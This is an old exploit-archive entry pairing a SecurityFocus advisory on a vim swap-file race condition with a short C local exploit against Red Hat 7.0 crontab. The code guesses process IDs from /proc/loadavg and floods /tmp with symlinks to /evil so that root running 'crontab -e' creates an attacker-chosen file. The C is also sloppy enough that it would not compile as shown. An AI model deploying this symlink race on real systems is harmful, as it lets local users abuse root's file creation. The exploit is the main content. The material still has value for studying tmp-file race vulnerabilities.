/*
source: http://www.securityfocus.com/bid/2927/info

Vim is an enhanced version of the popular text editor vi.

A race condition vulnerability exists in the swap file mechanism used by the 'vim' program. The error occurs when a swap file name for a file being opened is symbolically linked to a non-existent file.

By conjecturing the name of a file to be edited by another user, it may be possible for a local user to create a malicious symbolic link to a non-existent file. This could cause the new target file to be created with the permissions of the user running vim. 
*/

/*******************************************************************
             Crontab tmp file race condition

   http://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=37771

   Apparently this is fixed. Wonder why it still works. 
      -- zen-parse

                     Local exploit

   Quick and dirty exploit for crontab insecure tmp files
   Redhat 7.0 - kept up2date with up2date
   Checked Tue Jun 26 00:15:32 NZST 2001
   -rw-------    1 root     root         4096 Jun 26 00:15 evil

   Requires root to execute crontab -e while the program is
   running.

   Not really likely to be too big of a problem, I hope.

   Could possibly be useful with the (still unpatched) 
   makewhatis.cron bug.

/*******************************************************************
 #define SAFER [1000]
/*******************************************************************/
int shake(int script kiddy)
{
 int f;
 char r SAFER;
 int w;

 f=fopen("/proc/loadavg","r"); 
 fscanf(f,"%*s %*s %*s %*s %s",r);
 fclose(f);
 w=atoi(r);
 return w;
}

main(int argc,char *argv[])
{
 int p;
 char v SAFER;
 sprintf(v,"/tmp/.crontab.%d.swp",shake());
 symlink("/evil",v);
 while(access("/evil",0))
 {
  for(p=-30;p<0;p++)
  {
   sprintf(v,"/tmp/.crontab.%d.swp",shake()-p);
   symlink("/evil",v);
  }
  sprintf(v,"/tmp/.crontab.%d.swp",shake()-p);
  unlink(v);
 }
 for(p=-100;p<0;p++)
 {
  sprintf(v,"/tmp/.crontab.%d.swp",shake()-p);
  unlink(v);
 }
}

 /*****************************************************************
 **   ***   *       **       *********      ***********************
 **    *    *   **   ******   *******   **   **********************
 **         *   **   **      ********   *******   ***      ********
 **   * *   *       *******   *******   ******  *  *  *  *  *******
 **   ***   *   ***********   **   **   **   *  *  *  *  *  *******
 **   ***   *   ******       ***   ***      ***   **  ****  *******
 *****************************************************************/
         //   
        //  xxxx   xxx    xxx   x   x
       //  xx     x   x  x      x   x
      //   xx     x   x   xxx   x   x
     //    xx     x   x      x   x x  
    //      xxxx   xxx    xxx     x